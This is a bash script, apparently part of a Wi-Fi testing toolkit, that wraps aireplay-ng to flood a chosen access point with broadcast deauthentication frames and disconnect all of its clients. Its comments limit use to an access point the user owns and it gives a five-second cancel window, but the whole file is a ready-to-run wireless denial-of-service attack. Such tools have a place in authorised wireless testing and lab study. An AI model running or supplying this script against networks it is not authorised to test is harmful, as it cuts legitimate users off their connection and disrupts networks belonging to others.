#!/usr/bin/env bash
# Broadcast deauth: kicks EVERY client off the AP. Use only against an AP
# you fully own and which has no other clients you care about.
#
# Usage:
#   sudo ./04-deauth-broadcast.sh -a <bssid> -i <iface> [-n <frames>]

set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/lib/common.sh"

require_root

usage() {
    die "Usage: $0 -a <bssid> -i <iface> [-n <frames>]"
}

BSSID="" IFACE="" COUNT=10
while getopts "a:i:n:" opt; do
    case "$opt" in
        a) BSSID=$OPTARG ;;
        i) IFACE=$OPTARG ;;
        n) COUNT=$OPTARG ;;
        *) usage ;;
    esac
done

[[ -z "$BSSID" || -z "$IFACE" ]] && usage

warn "BROADCAST DEAUTH on BSSID=$BSSID"
warn "This disconnects ALL clients of that AP. Five-second cancel window."
sleep 5

aireplay-ng --deauth "$COUNT" -a "$BSSID" "$IFACE"
